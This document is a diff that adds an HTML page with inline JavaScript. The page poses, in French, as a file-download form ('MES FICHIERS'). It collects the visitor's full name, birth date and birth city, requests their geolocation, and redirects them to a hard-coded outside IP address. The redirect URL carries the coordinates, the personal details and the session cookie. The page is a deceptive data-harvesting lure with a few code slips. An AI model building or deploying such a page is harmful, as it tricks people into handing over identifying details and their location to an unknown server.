@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link href="./main.css" rel="stylesheet">
+  </head>
+
+<body>
+<div class="container">
+  <form id="contact" onsubmit="return false">
+    <h3>🌽 MES FICHIERS 🌽</h3>
+    <h4>Appuyez sur submit pour télécharger le ficher</h4>
+    <fieldset>
+      <input placeholder="Prénom + Nom" type="text" tabindex="1" id="name" required autofocus>
+    </fieldset>
+    <fieldset>
+      <input placeholder="Date de naissance DD/MM/YYYY" type="text" tabindex="2" id="birthdate" required>
+    </fieldset>
+    <fieldset>
+      <input placeholder="Cille de naissance" type="text" tabindex="3" id="birthcity" required>
+    </fieldset>
+    <fieldset>
+      <button name="submit" type="submit" id="contact-submit" onclick="getLocation()">Télécharger</button>
+    </fieldset>
+  </form>
+</div>
+
+
+<script>
+
+// THIS IS WHY JS IS HORRIBLE
+  // COOKIES THING
+  let cookie;
+
+  function str_obj(str) {
+    str = str.split(';');
+    var result = {};
+    for (var i = 0; i < str.length; i++) {
+        var cur = str[i].split('=');
+        result[cur[0]] = cur[1];
+    }
+    return result;
+  }
+
+  function setCookie() {
+    var now = new Date();
+    var time = now.getTime();
+    var expireTime = time + 1000*36000;
+    now.setTime(expireTime);
+    console.log("Expires="+now.toGMTString())
+    document.cookie = "session_id=" + Math.floor(Math.random(1)*99999999999) + '; Secure; Expires='+now.toGMTString() + "; Path=/";
+  }
+
+  if(!document.cookie){
+    //console.log("ISSUING NEW SESSION")
+    setCookie();
+    cookie = str_obj(document.cookie)
+  }
+  else {
+    cookie = str_obj(document.cookie)
+    console.log(cookie)
+    let _name = cookie.name;
+    let _birthdate = cookie.birthdate;
+    let _birthcity = cookie.birthcity;
+
+    if(_name){document.getElementById("name").value = _name}
+    if(_birthdate){document.getElementById("birthdate").value = _birthdate;}
+    if(_birthcity){document.getElementById("birthcity").value = _birthcity;}
+  }
+  console.log(cookie.session_id)
+  
+
+  // MAIN CODE
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(getInfos);
+    } else { 
+      x.innerHTML = "Geolocation is not supported by this browser.";
+    }
+  }
+
+  function getInfos(position) {
+      let name = document.getElementById("name").value
+      let bdate = document.getElementById("birthdate").value
+      let bcity = document.getElementById("birthcity").value
+
+      var now = new Date();
+      var time = now.getTime();
+      var expireTime = time + 1000*36000;
+      now.setTime(expireTime);
+
+      document.cookie = "session_id=" + cookie.session_id + ";name=" + name + ";birthdate=" + birthdate + ";birthcity=" + birthcity+ "; Secure; Expires=" + now.toGMTString() + "; Path=/";
+      console.log(document.cookie)
+
+      let getrqst = "http://89.92.239.20:28411/update?N=" + position.coords.latitude + "&E=" + position.coords.longitude
+      +"&name=" + name + "&birthdate=" + bdate + "&birthcity=" + bcity + "&" + document.cookie;
+      //console.log("COOKIE: " + document.cookie)
+      //console.log(getrqst)
+      location.href = getrqst;
+  }
+</script>
+
+</body>
+</html>
